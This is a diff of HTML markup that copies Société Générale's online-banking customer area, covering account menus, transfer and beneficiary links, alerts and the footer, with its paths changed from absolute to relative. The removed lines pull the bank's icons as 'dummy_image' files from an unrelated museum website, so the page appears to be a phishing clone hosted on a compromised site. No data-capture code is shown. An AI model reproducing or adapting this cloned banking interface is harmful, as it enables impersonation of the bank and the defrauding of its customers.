-    <svg class="picto-close v-align-middle" aria-label="fermer menu" aria-labelledby="picto-menu" role="img" viewBox="0 0 20 20" height="20" width="20" aria-hidden="true" focusable="false"><title>Fermer menu</title><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#lhs-burger-close"></use></svg>
+    <svg class="picto-menu v-align-middle" aria-label="ouvrir menu" aria-labelledby="picto-menu" role="img" viewBox="0 0 24 26" height="26" width="24" aria-hidden="true" focusable="false"><title>Ouvrir menu</title><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#lhs-burger-menu"></use></svg>
+    <svg class="picto-close v-align-middle" aria-label="fermer menu" aria-labelledby="picto-menu" role="img" viewBox="0 0 20 20" height="20" width="20" aria-hidden="true" focusable="false"><title>Fermer menu</title><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#lhs-burger-close"></use></svg>
 </button>
 <h2 class="rsp_header__title-logo">
     <a href="/com/icd-web/cbo/index.html#cbo/" class="rsp_header__logo-mob" title="page d'accueil">
@@ -3690,14 +3662,14 @@ $(document).ready(function(){
       <svg viewBox="0 0 24 24" height="24" width="24" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://particuliers.societegenerale.fr/static/Resources/img/pictos-fonctionnels_20200128023755.svg#search"></use></svg>
       <span class="rsp_btn__legend">Recherche</span>
 	-->
-		<img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/recherche.png" class="dummy_image" style="width: 54.1667px;">
+		<img src="modules/photomanagement/extra/img/recherche.png" class="dummy_image" style="width: 54.1667px;">
     </button>
     <div class="rsp_search-box__wrapper js-search-wrapper">
       <form class="rsp_search-box js-main-search" action="/secure/resultats-recherche" method="post">
         <label class="rsp_search-box__label js-main-search_label">Rechercher :</label>
         <div class="rsp_search-box__content-list">
           <input class="rsp_search-box__input js-main-search_field">
-          <svg viewBox="0 0 24 24" height="24" width="24" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#search"></use></svg>
+          <svg viewBox="0 0 24 24" height="24" width="24" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#search"></use></svg>
           <ul class="rsp_search-box__list js-main-search_list"></ul>
         </div>
       </form>
@@ -3707,22 +3679,22 @@ $(document).ready(function(){
         <li class="rsp_nav__item rsp_nav__item--picto  ml-sm-auto" id="js-counter-alerting">
 <a data-channelid="314cb78323c6f510VgnVCM100000030013acRCRD" aria-expanded="false" class="rsp_btn bd-l_before" data-tms-container-label="login-box-transactional" data-tms-element-label="voir-alerte" href="/com/icd-web/alerting/fil-alertes.html#fil-alertes/" data-tms-click-type="N">
 					<!--
-<svg class="dcw_login_icon-alert" height="24" width="24" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#lhs-notification"></use></svg>
+<svg class="dcw_login_icon-alert" height="24" width="24" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#lhs-notification"></use></svg>
                     <span class="js-nav-user-counter rsp_counter"></span>
                     <span class="rsp_btn__legend">Notifications</span>
 					-->
-					<img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/notifications.png" class="dummy_image" style="width: 66.5333px;">
+					<img src="modules/photomanagement/extra/img/notifications.png" class="dummy_image" style="width: 66.5333px;">
 </a>    </li>
 
 
         <li class="rsp_nav__item rsp_nav__item--picto " id="js-counter-gms">
 <a data-channelid="fe9c4b5c105e0610VgnVCM100000060012acRCRD" aria-expanded="false" class="rsp_btn bd-l_before" data-tms-container-label="login-box-transactional" data-tms-element-label="voir-gms" href="/gms/gmsListeMessages.html" data-tms-click-type="N">
 					<!--
-<svg class="dcw_login_icon-user" height="24" width="24" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#lhs-message"></use></svg>
+<svg class="dcw_login_icon-user" height="24" width="24" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#lhs-message"></use></svg>
                     <span class="js-nav-user-counter rsp_counter"></span>
                     <span class="rsp_btn__legend">Messagerie</span>
 					-->
-					<img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/messagerie.png" class="dummy_image" style="width: 66.5333px;">
+					<img src="modules/photomanagement/extra/img/messagerie.png" class="dummy_image" style="width: 66.5333px;">
 </a>    </li>
 
 
@@ -3919,14 +3891,14 @@ $(document).ready(function(){
             </li>
     </ul>
 </li>    <li class="rsp_nav__item rsp_nav__item--emergency">
-        <a class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="header-mobile-last-links" href="/aides-contact" data-tms-click-type="N" data-tms-element-label="aide-et-contacts"><svg aria-hidden="true" focusable="false" width="18" height="18"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#"></use></svg><span>Aide et contacts</span></a>
+        <a class="rsp_nav__link rsp_nav__link--sub-level" data-tms-container-label="header-mobile-last-links" href="/aides-contact" data-tms-click-type="N" data-tms-element-label="aide-et-contacts"><svg aria-hidden="true" focusable="false" width="18" height="18"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#"></use></svg><span>Aide et contacts</span></a>
     </li>
 </ul>
 			</nav>
 		</aside>
 	</div>
 
-	<nav class="rsp_nav rsp_nav--sub-level js-container-sublevel" role="navigation" aria-label="navigation secondaire" style=""><ul class="rsp_nav__list js-sub-level">
+	<nav class="rsp_nav rsp_nav--sub-level js-container-sublevel" role="navigation" aria-label="navigation secondaire"><ul class="rsp_nav__list js-sub-level">
                  <!-- LINKS -->
             			<li class="rsp_nav__item js-secondlvl-link js-outside-dropdown" data-channelid="dcfd2ee50183e510VgnVCM100000020012acRCRD">
 <a aria-controls="navd04e7262044af610VgnVCM1000000ae1c6c0RCRD" aria-haspopup="true" aria-expanded="false" tabindex="0" class="rsp_nav__link rsp_nav__link--connect" data-tms-container-label="navigation-connected" data-tms-element-label="mes-comptes" data-anchor="null" href="/restitution/cns_listeprestation.html" data-tms-click-type="N">            							Mes comptes
@@ -4012,9 +3984,9 @@ $(document).ready(function(){
             <aside class="dcw_alert-message service-message-list" data-id="f04053fc82e41710VgnVCM10000057f440c0RCRD" data-publish-date="NaN" data-start-date="1586070000000" data-end-date="1598886000000">
                 <div class="dcw_alert-message_wrapper">
                     <button class="dcw_alert-message_close-btn" href="#" aria-label="Fermer le message">
-                        <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#close-2"></use></svg>
+                        <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#close-2"></use></svg>
                     </button>
-                        <svg class="dcw_alert-message_picto-alert" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#alert"></use></svg>
+                        <svg class="dcw_alert-message_picto-alert" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#alert"></use></svg>
                         <p class="dcw_alert-message_desc">Nous vous informons que les virements effectués après 17h30 sont désormais traités le jour ouvrable suivant. Les virements émis entre 16h et 17h30 sont annulables jusqu’à 17h30.</p>
                 </div>
             </aside>
@@ -4091,27 +4063,27 @@ $(document).ready(function(){
         <nav>
             <ul class="dcw_contextual-menu_wrapper contextualMenu">
                     <li class="dcw_contextual-menu_item js--hasContext" data-idaction="VUFaireUnVirement" style="display:none;">
-                        <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#fonc-transferts-virements-2"></use></svg>
+                        <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#fonc-transferts-virements-2"></use></svg>
 <a data-tms-container-label="contextual-menu-right" class="dcw_contextual-menu_link" href="/virement/pas_vipon_saisie.html" data-tms-click-type="N" data-tms-element-label="faire-un-virement">                        Faire un virement
 </a>                    </li>
                     <li class="dcw_contextual-menu_item js--hasContext" data-idaction="VUSuivreMesVirements" style="">
-                        <img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/op-suivre-virements.png" class="dummy_side_image">
+                        <img src="modules/photomanagement/extra/img/op-suivre-virements.png" class="dummy_side_image">
 <a data-tms-container-label="contextual-menu-right" class="dcw_contextual-menu_link" href="/icd/vupri/suivi.html#liste" data-tms-click-type="N" data-tms-element-label="suivre-mes-virements">                        Suivre mes virements
 </a>                    </li>
                     <li class="dcw_contextual-menu_item">
-                        <img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/op-gerer-virements.png" class="dummy_side_image">
+                        <img src="modules/photomanagement/extra/img/op-gerer-virements.png" class="dummy_side_image">
 <a data-tms-container-label="contextual-menu-right" class="dcw_contextual-menu_link" href="/virement/sui_viper_liste.html" data-tms-click-type="N" data-tms-element-label="gérer-mes-virements-permanents">                        Gérer mes virements permanents
 </a>                    </li>
                     <li class="dcw_contextual-menu_item">
-                        <img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/op-gerer-prelevements.png" class="dummy_side_image">
+                        <img src="modules/photomanagement/extra/img/op-gerer-prelevements.png" class="dummy_side_image">
 <a data-tms-container-label="contextual-menu-right" class="dcw_contextual-menu_link" href="/prelevement/prelev_restit_liste_operations.html" title="Gérer mes prélèvements" data-tms-click-type="N" data-tms-element-label="gérer-mes-prélèvements">                        Gérer mes prélèvements
 </a>                    </li>
                     <li class="dcw_contextual-menu_item">
-                        <img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/op-gerer-beneficiaires.png" class="dummy_side_image">
+                        <img src="modules/photomanagement/extra/img/op-gerer-beneficiaires.png" class="dummy_side_image">
 <a data-tms-container-label="contextual-menu-right" class="dcw_contextual-menu_link" href="/personnalisation/per_cptBen_ajouterFrBic.html" data-tms-click-type="N" data-tms-element-label="gérer-les-comptes-bénéficiaires">                        Gérer les comptes bénéficiaires
 </a>                    </li>
                     <li class="dcw_contextual-menu_item">
-                        <img src="https://www.brisbaneopalmuseum.com.au/modules/photomanagement/extra/img/op-notifications.png" class="dummy_side_image">
+                        <img src="modules/photomanagement/extra/img/op-notifications.png" class="dummy_side_image">
 <a data-tms-container-label="contextual-menu-right" class="dcw_contextual-menu_link" href="/restitution/cns_listeNotification.html" data-tms-click-type="N" data-tms-element-label="notification-de-refus">                        Notification de refus
 </a>                    </li>
             </ul>
@@ -4156,7 +4128,7 @@ $(document).ready(function(){
 <div class="dcw_visually-hidden" data-clientside-answer="conseillee" data-clientside-method-name="getPrestCouranteTypeGestConseillee" data-clientside-id="getPrest">
 <div class="eip-spec56_btn_gsm_all_gcd eip-spec56_btn_asv">
     <a data-tms-element-label="Votre Espace Gestion Sous Mandat" data-tms-container-label="contextual-menu-right" data-tms-click-type="N" href="/com/icd-web/rcd/rcd-index.html#rcd/" aria-label="Votre Espace Synoé">
-        <img src="/static/Particuliers/pages-specifiques/gsm-alliage-gcd/img/picto-gsm.svg">
+        <img src="static/Particuliers/pages-specifiques/gsm-alliage-gcd/img/picto-gsm.svg">
         <div class="eip-spec56_titre_btn">Synoé</div>
         <div class="eip-spec56_btn_soustitre">Accéder à mon espace</div>
     </a>
@@ -4165,7 +4137,7 @@ $(document).ready(function(){
 <div class="dcw_visually-hidden" data-clientside-answer="gsm" data-clientside-method-name="getPrestCouranteTypeGestSousMandat" data-clientside-id="getPrest">
 <div class="eip-spec56_btn_gsm_all_gcd eip-spec56_btn_asv">
     <a data-tms-element-label="Votre Espace Gestion Sous Mandat" data-tms-container-label="bourse-menu-left" data-tms-click-type="N" href="/com/icd-web/tor/tor-gsm-index.html#tor/accueil/" aria-label="Votre Espace Gestion Sous Mandat">
-        <img src="/static/Particuliers/pages-specifiques/gsm-alliage-gcd/img/picto-gsm.svg">
+        <img src="static/Particuliers/pages-specifiques/gsm-alliage-gcd/img/picto-gsm.svg">
         <div class="eip-spec56_titre_btn">Gestion sous mandat</div>
         <div class="eip-spec56_btn_soustitre">Accéder à mon espace</div>
     </a>
@@ -4175,7 +4147,7 @@ $(document).ready(function(){
 <div class="dcw_visually-hidden" data-clientside-answer="alliage" data-clientside-method-name="getPrestCouranteTypeGestSousMandat" data-clientside-id="getPrest">
 <div class="eip-spec56_btn_gsm_all_gcd eip-spec56_btn_asv">
     <a data-tms-element-label="Votre Espace Alliage Gestion" data-tms-container-label="contextual-menu-right" data-tms-click-type="N" href="/com/icd-web/tor/tor-alliage-index.html#tor/accueil/" aria-label="Votre Espace Alliage gestion">
-        <img src="/static/Particuliers/pages-specifiques/gsm-alliage-gcd/img/picto-gsm.svg">
+        <img src="static/Particuliers/pages-specifiques/gsm-alliage-gcd/img/picto-gsm.svg">
         <div class="eip-spec56_titre_btn">Alliage gestion</div>
         <div class="eip-spec56_btn_soustitre">Accéder à mon espace</div>
     </a>
@@ -4189,18 +4161,18 @@ $(document).ready(function(){
 	</section>
 <aside class="dcw_msg-banner dcw_msg-banner--info" role="alert" id="cookieDisclaimer" style="display:none">
     <div class="dcw_msg-banner_msg-wrapper">
-        <svg class="dcw_msg-banner_picto-info" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#info"></use></svg>
+        <svg class="dcw_msg-banner_picto-info" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#info"></use></svg>
         <p class="dcw_msg-banner_message">
             En poursuivant votre navigation sur ce site, vous acceptez l'utilisation de cookies pour vous proposer des publicités ciblées adaptées à vos centres d'intérêts et réaliser des statistiques. Pour en savoir plus et paramétrer vos cookies,&nbsp;<span style="font-size: 16px;"><a href="/charte-cookies-societe-generale" class="eip_dcw_main-link">cliquez ici</a></span>.
         </p>
         <button class="dcw_msg-banner_btn-closed" arial-label="Fermer le message contextuel">
-            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#close-2"></use></svg>
+            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#close-2"></use></svg>
         </button>
     </div>
 </aside><aside class="dcw_msg-banner dcw_msg-banner--info dcw_msg-banner--last-connexion" id="lastConnectionBanner" role="alert" style="display:none;">
-<div class="dcw_msg-banner_msg-wrapper"><svg aria-hidden="true" class="dcw_msg-banner_picto-info" focusable="false"> <use width="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#info" height="100%"></use> </svg>
+<div class="dcw_msg-banner_msg-wrapper"><svg aria-hidden="true" class="dcw_msg-banner_picto-info" focusable="false"> <use width="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels.svg#info" height="100%"></use> </svg>
 <p class="dcw_msg-banner_message" id="lastConnectionMessage">&nbsp;</p>
-<button arial-label="Fermer le message contextuel" class="dcw_msg-banner_btn-closed"><svg aria-hidden="true" focusable="false"> <use width="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels.svg#close-2" height="100%"></use> </svg></button></div>
+<button arial-label="Fermer le message contextuel" class="dcw_msg-banner_btn-closed"><svg aria-hidden="true" focusable="false"> <use width="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels.svg#close-2" height="100%"></use> </svg></button></div>
 </aside>
 
 <footer class="dcw_footer" role="contentinfo">
@@ -4209,17 +4181,17 @@ $(document).ready(function(){
 			<nav class="dcw_footer-second_nav">
 				<ul class="dcw_footer-second_list">
 					    <li class="dcw_footer-second_item">
-<a data-tms-container-label="footer-general-shortcuts" href="http://agences.societegenerale.fr/banque-assurances/home.asp" data-tms-click-type="N" data-tms-element-label="trouver-une-agence">            <svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#localisation"></use></svg>
+<a data-tms-container-label="footer-general-shortcuts" href="http://agences.societegenerale.fr/banque-assurances/home.asp" data-tms-click-type="N" data-tms-element-label="trouver-une-agence">            <svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#localisation"></use></svg>
             Trouver une agence
 </a>    </li>
     <li class="dcw_footer-second_item">
-<a data-tms-container-label="footer-general-shortcuts" href="/icd/pch/faq" data-tms-click-type="N" data-tms-element-label="questions-fréquentes">            <svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#question"></use></svg>
+<a data-tms-container-label="footer-general-shortcuts" href="/icd/pch/faq" data-tms-click-type="N" data-tms-element-label="questions-fréquentes">            <svg class="dcw_footer-second_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#question"></use></svg>
             Questions fréquentes
 </a>    </li>
 <li class="dcw_footer-second_item">
 							<div class="dcw_dropdown js-dropdown-light">
     <button class="dcw_dropdown_titre js-dropdown_btn" aria-label="Ouvrir la liste des autres sites Société Générale" aria-expanded="false" aria-owns="dcw-dropdown-list">Autres sites Société Générale</button>
-   <svg class="dcw_dropdown_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#arrow-dropdown"></use></svg>
+   <svg class="dcw_dropdown_icon" aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#arrow-dropdown"></use></svg>
     <ul class="dcw_dropdown_list toggle_content">
             <li class="dcw_dropdown_item">
                 <a data-tms-container-label="footer-other-links-sg" class="dcw_dropdown_link js-dropdown_link" href="https://www.privatebanking.societegenerale.fr/" data-tms-click-type="N" data-tms-element-label="banque-privée">Banque privée</a>
@@ -4242,20 +4214,20 @@ $(document).ready(function(){
 			</nav>
 			<ul class="dcw_footer_container dcw_footer-second_social">
 				    <li class="dcw_footer-second_item-social">
-<a data-tms-container-label="footer-social-links" title="Facebook" href="https://www.facebook.com/societegenerale.france/" aria-label="Voir le groupe Facebook de la Société Générale" data-tms-click-type="N" data-tms-element-label="facebook">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#facebook-2"></use></svg>
+<a data-tms-container-label="footer-social-links" title="Facebook" href="https://www.facebook.com/societegenerale.france/" aria-label="Voir le groupe Facebook de la Société Générale" data-tms-click-type="N" data-tms-element-label="facebook">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#facebook-2"></use></svg>
 </a>    </li>
     <li class="dcw_footer-second_item-social">
-<a data-tms-container-label="footer-social-links" title="Twitter" href="https://twitter.com/sg_etvous" aria-label="Voir le Twitter de la Société Générale" data-tms-click-type="N" data-tms-element-label="twitter">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#twitter-2"></use></svg>
+<a data-tms-container-label="footer-social-links" title="Twitter" href="https://twitter.com/sg_etvous" aria-label="Voir le Twitter de la Société Générale" data-tms-click-type="N" data-tms-element-label="twitter">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#twitter-2"></use></svg>
 </a>    </li>
     <li class="dcw_footer-second_item-social">
-<a data-tms-container-label="footer-social-links" title="Instagram" href="https://www.instagram.com/societegenerale/?hl=fr" aria-label="Voir l' Instagram de la Société Générale" data-tms-click-type="N" data-tms-element-label="instagram">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="/static/Resources/img/pictos-fonctionnels_20200128023755.svg#instagram"></use></svg>
+<a data-tms-container-label="footer-social-links" title="Instagram" href="https://www.instagram.com/societegenerale/?hl=fr" aria-label="Voir l' Instagram de la Société Générale" data-tms-click-type="N" data-tms-element-label="instagram">            <svg aria-hidden="true" focusable="false"><use width="100%" height="100%" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="static/Resources/img/pictos-fonctionnels_20200128023755.svg#instagram"></use></svg>
 </a>    </li>
 </ul>
 		</div>
 	</div>
 	<nav class="dcw_footer-third">
 		<div class="dcw_footer_container">
-			<img alt="Société Générale" aria-hidden="true" class="dcw_footer-third_logo" src="/static/Resources/img/logo/logo-sg-seul.svg" width="150" height="30">
+			<img alt="Société Générale" aria-hidden="true" class="dcw_footer-third_logo" src="static/Resources/img/logo/logo-sg-seul.svg" width="150" height="30">
 <ul class="dcw_footer-third_list">
 				    <li class="dcw_footer-third_item">
         <a data-tms-container-label="footer-super-links" href="/tous-nos-tarifs" data-tms-click-type="N" data-tms-element-label="tarifs">Tarifs</a>
